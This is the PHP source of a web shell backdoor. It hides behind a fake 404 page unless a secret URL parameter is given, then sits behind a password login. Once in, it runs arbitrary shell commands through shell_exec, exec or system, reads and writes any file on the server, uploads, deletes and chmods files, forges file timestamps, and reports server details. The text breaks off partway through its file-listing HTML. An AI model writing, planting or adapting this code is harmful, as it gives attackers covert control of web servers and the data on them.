<?php
@error_reporting(0);
@ini_set('upload_max_filesize','50M');
@ini_set('post_max_size','50M');
@ini_set('max_execution_time',300);

/* ── Auth config ─────────────────────────────────────── */
define('SH_PASS',   '205f4dbefb83d4b4608c517d41883c86'); 
define('SH_KEY',    'ayam');
define('SH_TTL',    6 * 3600);
define('SH_COOKIE', 'sh_tok');

function sh_secret() {
    return md5(SH_PASS . @php_uname() . __FILE__);
}
function sh_auth_check() {
    if (!isset($_COOKIE[SH_COOKIE])) return false;
    $parts = explode('|', $_COOKIE[SH_COOKIE]);
    if (count($parts) !== 2) return false;
    $ts  = (int)$parts[0];
    $sig = $parts[1];
    if (time() - $ts > SH_TTL) return false;
    $expected = md5($ts . sh_secret());
    return function_exists('hash_equals') ? hash_equals($expected, $sig) : ($expected === $sig);
}
function sh_auth_set() {
    $ts  = time();
    $sig = md5($ts . sh_secret());
    setcookie(SH_COOKIE, $ts.'|'.$sig, time() + SH_TTL, '/');
}
function sh_auth_clear() {
    setcookie(SH_COOKIE, '', time() - 3600, '/');
}

/* ── Auth gate ───────────────────────────────────────── */
$_sh_key_present = isset($_GET[SH_KEY]);
$_sh_authed      = sh_auth_check();

// No ?ayam → fake 404
if (!$_sh_key_present && !$_sh_authed) {
    header('HTTP/1.0 404 Not Found');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
    exit;
}

// Handle login POST
if (isset($_POST['sh_pw'])) {
    $input_hash = md5(trim($_POST['sh_pw']));
    $ok = function_exists('hash_equals') ? hash_equals(SH_PASS, $input_hash) : (SH_PASS === $input_hash);
    if ($ok) {
        sh_auth_set();
        $redir = '?' . SH_KEY . '&authed=1';
        header('Location: ' . $redir);
        exit;
    } else {
        $sh_login_err = 'Wrong password.';
    }
}

// Show login form if not authed
if (!$_sh_authed) {
    $sh_login_err = isset($sh_login_err) ? $sh_login_err : '';
    ?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;color:#c9d1d9;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:32px 28px;width:320px}
h2{font-size:15px;color:#58a6ff;margin-bottom:20px;text-align:center;letter-spacing:.05em}
label{font-size:12px;color:#8b949e;display:block;margin-bottom:6px}
input[type=password]{width:100%;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;padding:8px 10px;font-family:monospace;font-size:13px;outline:none}
input[type=password]:focus{border-color:#58a6ff}
button{width:100%;margin-top:14px;padding:9px;background:#1f6feb;border:none;border-radius:4px;color:#fff;font-family:monospace;font-size:13px;cursor:pointer}
button:hover{background:#388bfd}
.err{margin-top:12px;font-size:12px;color:#f85149;text-align:center}
</style>
</head>
<body>
<div class="box">
<h2>&#x25A0; Shell Access</h2>
<form method="post" action="?<?php echo SH_KEY; ?>">
<label>Password</label>
<input type="password" name="sh_pw" autofocus autocomplete="current-password">
<button type="submit">Login</button>
<?php if ($sh_login_err): ?><div class="err"><?php echo htmlspecialchars($sh_login_err,ENT_QUOTES,'UTF-8'); ?></div><?php endif; ?>
</form>
</div>
</body>
</html><?php
    exit;
}
/* ── Authenticated past this point ───────────────────── */

define('SH_HOME', __DIR__);
$base = '/';

/* ── AJAX endpoints ──────────────────────────────────── */
if (isset($_GET['action'])) {
    $act = $_GET['action'];

    // Read file for editor
    if ($act === 'read' && isset($_GET['file'])) {
        $rf = realpath($_GET['file']);
        if ($rf && strpos($rf, $base) === 0 && is_file($rf)) {
            header('Content-Type: text/plain; charset=utf-8');
            readfile($rf);
        }
        exit;
    }

    // Shell command
    if ($act === 'cmd' && $_SERVER['REQUEST_METHOD'] === 'POST') {
        $cwd = (isset($_POST['cwd']) && is_dir($_POST['cwd'])) ? $_POST['cwd'] : SH_HOME;
        $cmd = isset($_POST['cmd']) ? trim($_POST['cmd']) : '';
        if ($cmd !== '') {
            if      (function_exists('shell_exec')) { $o = shell_exec('cd '.escapeshellarg($cwd).' && '.$cmd.' 2>&1'); echo ($o===null?'(no output)':$o); }
            elseif  (function_exists('exec'))       { exec('cd '.escapeshellarg($cwd).' && '.$cmd.' 2>&1', $ls); echo ($ls ? implode("\n",$ls) : '(no output)'); }
            elseif  (function_exists('system'))     { ob_start(); system('cd '.escapeshellarg($cwd).' && '.$cmd.' 2>&1'); echo ob_get_clean(); }
            else    { echo '[disabled] shell_exec/exec/system are all disabled on this server'; }
        }
        exit;
    }

    // Save file
    if ($act === 'save' && $_SERVER['REQUEST_METHOD'] === 'POST') {
        $sf      = isset($_POST['file'])    ? $_POST['file']    : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        $rdir    = @realpath(dirname($sf));
        if ($rdir && strpos($rdir, $base) === 0) {
            $ok = @file_put_contents($sf, $content);
            echo ($ok !== false) ? 'OK:'.$ok : 'ERR:write failed';
        } else {
            echo 'ERR:access denied';
        }
        exit;
    }
}

/* ── Helpers ─────────────────────────────────────────── */
function sh_safe($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
// sh_esc: use ONLY inside HTML attributes (onclick="..."), NOT inside <script> tags
function sh_esc($s)  { return htmlspecialchars(json_encode($s), ENT_QUOTES, 'UTF-8'); }
function sh_size($b) {
    if ($b >= 1073741824) return round($b/1073741824,1).'G';
    if ($b >= 1048576)    return round($b/1048576,1).'M';
    if ($b >= 1024)       return round($b/1024,1).'K';
    return $b.'B';
}
function sh_perms($f) {
    $p = @fileperms($f); if ($p===false) return '?????????';
    $r  = ($p&0x0100)?'r':'-'; $r .= ($p&0x0080)?'w':'-'; $r .= ($p&0x0040)?'x':'-';
    $r .= ($p&0x0020)?'r':'-'; $r .= ($p&0x0010)?'w':'-'; $r .= ($p&0x0008)?'x':'-';
    $r .= ($p&0x0004)?'r':'-'; $r .= ($p&0x0002)?'w':'-'; $r .= ($p&0x0001)?'x':'-';
    return $r;
}
function sh_oct($f) { $p = @fileperms($f); return $p !== false ? substr(sprintf('%o',$p),-4) : '????'; }
function sh_owner($f) {
    if (!function_exists('posix_getpwuid')) return '';
    $s = @stat($f); if (!$s) return '';
    $u = @posix_getpwuid($s['uid']); $g = @posix_getgrgid($s['gid']);
    $un = $u ? $u['name'] : $s['uid'];
    $gn = $g ? $g['name'] : $s['gid'];
    return $un.':'.$gn;
}
function sh_icon($f) {
    $a = 'width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"';
    if (is_dir($f)) return '<svg '.$a.' style="color:#d29922"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>';
    $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
    if (in_array($ext,array('php','py','js','ts','sh','bash','html','htm','css','scss','rb','go','java','c','cpp','cs','h','sql','lua','rs')))
        return '<svg '.$a.' style="color:#79c0ff"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>';
    if (in_array($ext,array('jpg','jpeg','png','gif','svg','webp','ico','bmp')))
        return '<svg '.$a.' style="color:#3fb950"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>';
    if (in_array($ext,array('zip','tar','gz','rar','7z','bz2','xz')))
        return '<svg '.$a.' style="color:#d29922"><polyline points="8 17 12 21 16 17"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29"/></svg>';
    if (in_array($ext,array('json','xml','yml','yaml','ini','conf','env','toml')))
        return '<svg '.$a.' style="color:#8b949e"><circle cx="12" cy="12" r="3"/><path d="M12 2v2M12 20v2M2 12h2M20 12h2"/></svg>';
    if (in_array($ext,array('sql','db','sqlite')))
        return '<svg '.$a.' style="color:#58a6ff"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>';
    if (in_array($ext,array('pem','key','crt','p12','pfx')))
        return '<svg '.$a.' style="color:#f85149"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>';
    return '<svg '.$a.' style="color:#8b949e"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>';
}
function sh_rmdir($d) {
    $items = @scandir($d); if (!$items) return @rmdir($d);
    foreach ($items as $i) {
        if ($i==='.'||$i==='..') continue;
        $p = $d.'/'.$i; is_dir($p) ? sh_rmdir($p) : @unlink($p);
    }
    return @rmdir($d);
}

/* ── Resolve path ─────────────────────────────────────── */
if (isset($_GET['path'])) {
    $t = realpath($_GET['path']);
    $path = ($t !== false && strpos($t, $base) === 0) ? $t : realpath(SH_HOME);
} else {
    $path = realpath(SH_HOME);
}
if (!$path) $path = SH_HOME;

$tab   = isset($_GET['tab'])   ? $_GET['tab']   : 'browse';
$msg   = isset($_GET['msg'])   ? $_GET['msg']   : '';
$msgok = !isset($_GET['msgok']) || $_GET['msgok'] !== '0';

/* ── POST mutations → redirect ────────────────────────── */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';
    if (isset($_POST['path']) && is_dir($_POST['path'])) {
        $pp = realpath($_POST['path']); if (!$pp) $pp = $path;
    } else { $pp = $path; }

    if ($action === 'upload' && isset($_FILES['ufile'])) {
        $ok = $fail = 0;
        $n = count($_FILES['ufile']['name']);
        for ($i = 0; $i < $n; $i++) {
            if ($_FILES['ufile']['error'][$i] !== 0) { $fail++; continue; }
            $dest = rtrim($pp,'/').'/'.basename($_FILES['ufile']['name'][$i]);
            move_uploaded_file($_FILES['ufile']['tmp_name'][$i], $dest) ? $ok++ : $fail++;
        }
        $msg = 'Uploaded '.$ok.' file(s)'.($fail ? ', '.$fail.' failed' : '');
        $msgok = ($fail === 0);
    } elseif ($action === 'mkdir' && isset($_POST['dname']) && trim($_POST['dname']) !== '') {
        $nd = rtrim($pp,'/').'/'.basename(trim($_POST['dname']));
        $msg = @mkdir($nd, 0755, true) ? 'Folder created' : 'mkdir failed';
        $msgok = ($msg === 'Folder created');
    } elseif ($action === 'newfile' && isset($_POST['fname']) && trim($_POST['fname']) !== '') {
        $nf = rtrim($pp,'/').'/'.basename(trim($_POST['fname']));
        $msg = (@file_put_contents($nf,'') !== false) ? 'File created' : 'Create failed';
        $msgok = ($msg === 'File created');
    } elseif ($action === 'delete' && isset($_POST['dpath'])) {
        $dp = realpath($_POST['dpath']);
        if ($dp && strpos($dp,$base) === 0) {
            $ok2 = is_file($dp) ? @unlink($dp) : sh_rmdir($dp);
            $msg = $ok2 ? 'Deleted' : 'Delete failed'; $msgok = (bool)$ok2;
        } else { $msg = 'Access denied'; $msgok = false; }
    } elseif ($action === 'rename' && isset($_POST['rpath']) && isset($_POST['rname']) && trim($_POST['rname']) !== '') {
        $old = realpath($_POST['rpath']);
        if ($old && strpos($old,$base) === 0) {
            $new = dirname($old).'/'.basename(trim($_POST['rname']));
            $ok2 = @rename($old, $new);
            $msg = $ok2 ? 'Renamed' : 'Rename failed'; $msgok = (bool)$ok2;
        } else { $msg = 'Access denied'; $msgok = false; }
    } elseif ($action === 'chmod' && isset($_POST['cpath']) && isset($_POST['cmode'])) {
        $cp = realpath($_POST['cpath']);
        if ($cp && strpos($cp,$base) === 0) {
            $ok2 = @chmod($cp, octdec(trim($_POST['cmode'])));
            $msg = $ok2 ? 'Permission changed' : 'chmod failed'; $msgok = (bool)$ok2;
        } else { $msg = 'Access denied'; $msgok = false; }
    } elseif ($action === 'chdate' && isset($_POST['cdpath']) && isset($_POST['cdval'])) {
        $cp2 = realpath($_POST['cdpath']);
        if ($cp2 && strpos($cp2,$base) === 0) {
            $ts = strtotime(trim($_POST['cdval']));
            $ok2 = $ts ? @touch($cp2, $ts, $ts) : false;
            $msg = $ok2 ? 'Timestamp changed' : 'touch failed'; $msgok = (bool)$ok2;
        } else { $msg = 'Access denied'; $msgok = false; }
    }

    header('Location: ?path='.urlencode($path).'&tab=browse&msg='.urlencode($msg).'&msgok='.($msgok?'1':'0'));
    exit;
}

/* ── Directory listing ───────────────────────────────── */
$entries = array();
if (is_dir($path)) {
    $raw = @scandir($path);
    if ($raw) {
        $dirs = $files_arr = array();
        foreach ($raw as $item) {
            if ($item==='.'||$item==='..') continue;
            $fp = rtrim($path,'/').DIRECTORY_SEPARATOR.$item;
            if (is_dir($fp)) $dirs[] = $item; else $files_arr[] = $item;
        }
        sort($dirs); sort($files_arr);
        foreach ($dirs      as $d) $entries[] = rtrim($path,'/').DIRECTORY_SEPARATOR.$d;
        foreach ($files_arr as $f) $entries[] = rtrim($path,'/').DIRECTORY_SEPARATOR.$f;
    }
}
$parent = dirname($path);
$home   = realpath(SH_HOME);

/* ── Server info ─────────────────────────────────────── */
$sv_host = @php_uname('n');
$sv_user = function_exists('get_current_user') ? get_current_user() : '?';
$sv_php  = PHP_VERSION;
$sv_os   = @php_uname('s').' '.@php_uname('r');
$sv_soft = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '?';
$sv_df   = @disk_free_space('/');
$sv_dt   = @disk_total_space('/');
$sv_dis  = ini_get('disable_functions') ? ini_get('disable_functions') : 'none';
$sv_una  = @php_uname();
$sv_ini  = function_exists('php_ini_loaded_file') ? (php_ini_loaded_file() ?: 'not found') : '?';
$sv_ext  = implode(', ', get_loaded_extensions());
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>shell @ <?php echo sh_safe($sv_host); ?></title>
<style>
:root{
  --bg0:#080808;--bg1:#0e0e0e;--bg2:#141414;--bg3:#1a1a1a;--bgh:#1e1e1e;
  --bd0:rgba(255,255,255,.04);--bd1:rgba(255,255,255,.07);--bd2:rgba(255,255,255,.10);--bd3:rgba(255,255,255,.18);
  --tx0:#f0f0f0;--tx1:#a0a0a0;--tx2:#606060;--tx3:#3a3a3a;
  --ac:#00c8ff;--acd:rgba(0,200,255,.12);
  --gr:#3dd68c;--grd:rgba(61,214,140,.10);
  --am:#f5a623;--amd:rgba(245,166,35,.12);
  --re:#ff4d4d;--red:rgba(255,77,77,.12);
  --ui:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  --mono:'JetBrains Mono','Fira Code',ui-monospace,Consolas,monospace;
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:var(--ui);background:var(--bg0);color:var(--tx0);font-size:13px;line-height:1.5}
a{color:var(--ac);text-decoration:none}
/* ── topbar ── */
.topbar{height:44px;background:var(--bg1);border-bottom:1px solid var(--bd1);display:flex;align-items:center;padding:0 16px;gap:5px;position:sticky;top:0;z-index:50}
.logo{font-size:11px;font-weight:700;color:var(--am);white-space:nowrap;margin-right:4px;flex-shrink:0}
.tbtn{height:28px;padding:0 10px;background:transparent;border:1px solid var(--bd2);border-radius:4px;color:var(--tx1);font-family:var(--ui);font-size:12px;cursor:pointer;display:inline-flex;align-items:center;gap:4px;transition:all .12s;white-space:nowrap;flex-shrink:0}
.tbtn:hover{background:var(--bgh);border-color:var(--bd3);color:var(--tx0)}
.tbtn.active{background:var(--acd);border-color:var(--ac);color:var(--ac)}
.tsep{flex:1}
.chip{font-family:var(--mono);font-size:11px;color:var(--tx2);background:var(--bg2);border:1px solid var(--bd0);border-radius:4px;padding:3px 7px;white-space:nowrap;flex-shrink:0}
.chip b{color:var(--tx1);font-weight:500}
/* ── layout ── */
.content{max-width:1400px;margin:0 auto;padding:16px 20px}
/* ── msg ── */
.msg{padding:8px 12px;border-radius:4px;margin-bottom:12px;font-size:12px}
.msg.ok{background:var(--grd);border:1px solid var(--gr);color:var(--gr)}
.msg.err{background:var(--red);border:1px solid var(--re);color:var(--re)}
/* ── breadcrumb ── */
.breadcrumb{background:var(--bg1);border:1px solid var(--bd1);border-radius:6px;padding:7px 12px;display:flex;align-items:center;gap:2px;flex-wrap:wrap;font-family:var(--mono);font-size:12px;margin-bottom:10px}
.bc-home{display:inline-flex;align-items:center;color:var(--tx2);margin-right:4px}
.bc-home:hover{color:var(--ac)}
.bc-sep{color:var(--tx3);padding:0 2px}
.breadcrumb a{color:var(--tx1);text-decoration:none}
.breadcrumb a:hover{color:var(--ac)}
.bc-cur{color:var(--tx0);font-weight:500}
/* ── toolbar ── */
.toolbar{display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap}
.btn{height:28px;padding:0 10px;background:var(--bg2);border:1px solid var(--bd2);border-radius:4px;color:var(--tx1);font-family:var(--ui);font-size:12px;cursor:pointer;display:inline-flex;align-items:center;gap:4px;transition:all .12s;text-decoration:none;white-space:nowrap}
.btn:hover{background:var(--bgh);border-color:var(--bd3);color:var(--tx0)}
.btn.danger:hover{border-color:var(--re);color:var(--re)}
.btn.primary{background:var(--acd);border-color:var(--ac);color:var(--ac)}
.btn.primary:hover{background:rgba(0,200,255,.22)}
/* ── file table ── */
.file-panel{background:var(--bg1);border:1px solid var(--bd1);border-radius:8px;overflow:hidden}
.file-table{width:100%;border-collapse:collapse}
.file-table thead tr{background:var(--bg2);border-bottom:1px solid var(--bd1)}
.file-table th{padding:7px 12px;font-size:10px;font-weight:600;letter-spacing:.7px;text-transform:uppercase;color:var(--tx2);text-align:left;white-space:nowrap}
.file-table td{padding:5px 12px;border-bottom:1px solid var(--bd0);vertical-align:middle}
.file-table tbody tr:last-child td{border-bottom:none}
.file-table tbody tr:hover td{background:var(--bgh)}
.fname{display:flex;align-items:center;gap:7px;min-width:0}
.fname a{color:var(--tx0);text-decoration:none;font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.fname a:hover{color:var(--ac)}
.fname a.dir{color:var(--am)}
.fname a.dir:hover{color:var(--ac)}
/* perm badge */
.perm-sym{font-family:var(--mono);font-size:11px;color:var(--tx2)}
.perm-oct{font-family:var(--mono);font-size:11px;background:var(--amd);color:var(--am);border-radius:3px;padding:1px 5px;margin-left:4px}
.col-owner{font-family:var(--mono);font-size:11px;color:var(--tx2)}
.col-size{font-family:var(--mono);font-size:11px;color:var(--tx2);white-space:nowrap}
.col-date{font-size:11px;color:var(--tx2);white-space:nowrap}
/* icon action buttons */
.actions{display:flex;gap:2px;justify-content:flex-end;flex-shrink:0}
.iab{width:26px;height:26px;background:transparent;border:1px solid transparent;border-radius:4px;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;transition:all .12s;flex-shrink:0;padding:0}
.iab:hover{background:var(--bgh);border-color:var(--bd2)}
.iab.edit-btn{color:var(--ac)}
.iab.edit-btn:hover{background:rgba(0,200,255,.08);border-color:rgba(0,200,255,.3)}
.iab.dl-btn{color:var(--gr)}
.iab.dl-btn:hover{background:rgba(61,214,140,.08);border-color:rgba(61,214,140,.3)}
.iab.rename-btn{color:#a78bfa}
.iab.rename-btn:hover{background:rgba(167,139,250,.08);border-color:rgba(167,139,250,.3)}
.iab.chmod-btn{color:var(--am)}
.iab.chmod-btn:hover{background:rgba(245,166,35,.08);border-color:rgba(245,166,35,.3)}
.iab.chdate-btn{color:#60a5fa}
.iab.chdate-btn:hover{background:rgba(96,165,250,.08);border-color:rgba(96,165,250,.3)}
.iab.copy-btn{color:#94a3b8}
.iab.copy-btn:hover{background:rgba(148,163,184,.08);border-color:rgba(148,163,184,.3)}
.iab.del-btn{color:var(--re)}
.iab.del-btn:hover{background:rgba(255,77,77,.08);border-color:rgba(255,77,77,.3)}
/* ── shell ── */
.term-wrap{background:var(--bg1);border:1px solid var(--bd1);border-radius:8px;padding:16px}
.term-cwd{font-family:var(--mono);font-size:11px;color:var(--tx2);margin-bottom:10px}
.term-cwd span{color:var(--ac)}
.term-row{display:flex;align-items:center;gap:8px;background:var(--bg0);border:1px solid var(--bd1);border-radius:6px;padding:8px 12px}
.term-ps1{font-family:var(--mono);font-size:12px;color:var(--gr);white-space:nowrap}
.term-input{flex:1;background:transparent;border:none;outline:none;font-family:var(--mono);font-size:12px;color:var(--tx0);caret-color:var(--ac)}
.term-run{height:24px;padding:0 12px;background:var(--bg2);border:1px solid var(--bd2);border-radius:4px;color:var(--tx1);font-family:var(--mono);font-size:11px;cursor:pointer;flex-shrink:0}
.term-run:hover{background:var(--acd);border-color:var(--ac);color:var(--ac)}
.term-out{margin-top:12px;background:var(--bg0);border:1px solid var(--bd0);border-radius:6px;padding:12px;font-family:var(--mono);font-size:12px;color:var(--gr);white-space:pre-wrap;word-break:break-all;max-height:420px;overflow-y:auto;line-height:1.7}
/* ── upload ── */
.upload-wrap{background:var(--bg1);border:1px solid var(--bd1);border-radius:8px;padding:16px}
.upload-cwd{font-family:var(--mono);font-size:11px;color:var(--tx2);margin-bottom:12px}
.upload-cwd span{color:var(--tx1)}
/* ── info ── */
.info-wrap{background:var(--bg1);border:1px solid var(--bd1);border-radius:8px;overflow:hidden}
.info-table{width:100%;border-collapse:collapse}
.info-table td{padding:7px 14px;border-bottom:1px solid var(--bd0);vertical-align:top;font-size:12px}
.info-table tbody tr:last-child td{border-bottom:none}
.info-key{color:var(--tx2);width:180px;font-family:var(--mono);font-size:11px;white-space:nowrap}
.info-val{color:var(--tx0);word-break:break-all}
.info-sec{background:var(--bg2);padding:6px 14px;font-size:10px;font-weight:600;letter-spacing:.7px;text-transform:uppercase;color:var(--tx2)}
/* ── inputs ── */
input[type=text],textarea,select{background:var(--bg2);border:1px solid var(--bd2);color:var(--tx0);font-family:var(--ui);font-size:12px;padding:6px 10px;outline:none;border-radius:4px}
input[type=text]:focus,textarea:focus{border-color:var(--ac)}
input[type=file]{color:var(--tx1);font-size:12px}
/* ── modal ── */
.modal-bg{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.7);z-index:100;align-items:center;justify-content:center}
.modal{background:var(--bg2);border:1px solid var(--bd2);border-radius:8px;padding:20px;min-width:300px;max-width:480px;width:90%}
.modal h3{font-size:13px;font-weight:600;margin-bottom:14px}
.modal-row{margin-bottom:10px}
.modal-row label{display:block;font-size:11px;color:var(--tx2);margin-bottom:4px}
.modal-row input{width:100%}
.modal-btns{display:flex;gap:6px;justify-content:flex-end;margin-top:14px}
/* ── editor overlay ── */
.editor-ov{display:none;position:fixed;top:0;left:0;right:0;bottom:0;z-index:200;background:var(--bg0);flex-direction:column}
.editor-bar{height:44px;background:var(--bg1);border-bottom:1px solid var(--bd1);display:flex;align-items:center;padding:0 16px;gap:8px;flex-shrink:0}
.editor-fname{font-family:var(--mono);font-size:13px;color:var(--am);margin-right:auto;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.editor-st{font-size:11px;color:var(--tx2);white-space:nowrap}
.editor-body{flex:1;display:flex;flex-direction:column;overflow:hidden}
.editor-ta{flex:1;resize:none;width:100%;background:var(--bg0);border:none;color:var(--tx0);font-family:var(--mono);font-size:12px;line-height:1.7;padding:16px 20px;outline:none}
/* ── scrollbar ── */
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:var(--bg0)}
::-webkit-scrollbar-thumb{background:var(--bd2);border-radius:3px}
</style>
</head>
<body>

<!-- ── TOPBAR ─────────────────────────────────────────── -->
<div class="topbar">
  <span class="logo">&#9654; shell</span>
  <button type="button" class="tbtn <?php echo $tab==='browse'?'active':''; ?>" data-tab="browse" onclick="setTab('browse')">
    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>Files
  </button>
  <button type="button" class="tbtn <?php echo $tab==='shell'?'active':''; ?>" data-tab="shell" onclick="setTab('shell')">
    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Shell
  </button>
  <button type="button" class="tbtn <?php echo $tab==='upload'?'active':''; ?>" data-tab="upload" onclick="setTab('upload')">
    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"/></svg>Upload
  </button>
  <button type="button" class="tbtn <?php echo $tab==='info'?'active':''; ?>" data-tab="info" onclick="setTab('info')">
    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>Info
  </button>
  <div class="tsep"></div>
  <span class="chip"><b><?php echo sh_safe($sv_host); ?></b></span>
  <span class="chip"><?php echo sh_safe($sv_user); ?></span>
  <span class="chip">PHP <?php echo sh_safe($sv_php); ?></span>
</div>

<div class="content">

<?php if ($msg !== ''): ?>
<div class="msg <?php echo $msgok?'ok':'err'; ?>"><?php echo sh_safe($msg); ?></div>
<?php endif; ?>

<!-- ══ BROWSE ══════════════════════════════════════════ -->
<div id="tab-browse" class="tabsec" style="<?php echo $tab!=='browse'?'display:none':''; ?>">

  <div class="breadcrumb">
    <!-- home button -->
    <a class="bc-home" href="?path=<?php echo urlencode($home); ?>&tab=browse" title="Home (<?php echo sh_safe($home); ?>)">
      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
    </a>
    <?php
    $bparts = array_values(array_filter(explode('/', $path)));
    $bbuilt = '';
    $btotal = count($bparts);
    echo '<span class="bc-sep">/</span>';
    for ($bi = 0; $bi < $btotal; $bi++) {
        $bbuilt .= '/'.$bparts[$bi];
        if ($bi < $btotal - 1) {
            echo '<a href="?path='.urlencode($bbuilt).'&tab=browse">'.sh_safe($bparts[$bi]).'</a><span class="bc-sep">/</span>';
        } else {
            echo '<span class="bc-cur">'.sh_safe($bparts[$bi]).'</span>';
        }
    }
    if ($path === '/') echo '<span class="bc-cur">root</span>';
    ?>
  </div>

  <div class="toolbar">
    <?php if ($parent && $parent !== $path): ?>
    <a class="btn" href="?path=<?php echo urlencode($parent); ?>&tab=browse">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>Back
    </a>
    <?php endif; ?>
    <button type="button" class="btn" onclick="showModal('m-mkdir')">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>New Folder
    </button>
    <button type="button" class="btn" onclick="showModal('m-newfile')">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>New File
    </button>
    <button type="button" class="btn" onclick="setTab('upload')">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/></svg>Upload Here
    </button>
  </div>

  <div class="file-panel">
    <table class="file-table">
      <thead><tr>
        <th>Name</th>
        <th>Permissions</th>
        <?php if (function_exists('posix_getpwuid')): ?><th>Owner</th><?php endif; ?>
        <th>Size</th>
        <th>Modified</th>
        <th style="text-align:right;padding-right:14px">Actions</th>
      </tr></thead>
      <tbody>
      <?php if (empty($entries)): ?>
      <tr><td colspan="6" style="text-align:center;color:var(--tx2);padding:24px">Empty directory</td></tr>
      <?php else: ?>
      <?php foreach ($entries as $fp):
          $fn    = basename($fp);
          $isdir = is_dir($fp);
          $perms = sh_perms($fp);
          $oct   = sh_oct($fp);
          $owner = sh_owner($fp);
          $fsz   = $isdir ? '—' : (@filesize($fp) !== false ? sh_size(filesize($fp)) : '?');
          $mt    = @filemtime($fp);
          $fdate = $mt ? date('Y-m-d H:i', $mt) : '?';
          $iszip = in_array(strtolower(pathinfo($fp, PATHINFO_EXTENSION)), array('zip'));
      ?>
      <tr>
        <td style="max-width:280px">
          <div class="fname">
            <?php echo sh_icon($fp); ?>
            <?php if ($isdir): ?>
            <a class="dir" href="?path=<?php echo urlencode($fp); ?>&tab=browse" title="<?php echo sh_safe($fp); ?>"><?php echo sh_safe($fn); ?></a>
            <?php else: ?>
            <a href="#" onclick="openEditor(<?php echo sh_esc($fp); ?>,<?php echo sh_esc($fn); ?>);return false" title="<?php echo sh_safe($fp); ?>"><?php echo sh_safe($fn); ?></a>
            <?php endif; ?>
          </div>
        </td>
        <td>
          <span class="perm-sym"><?php echo sh_safe($perms); ?></span><span class="perm-oct"><?php echo sh_safe($oct); ?></span>
        </td>
        <?php if (function_exists('posix_getpwuid')): ?>
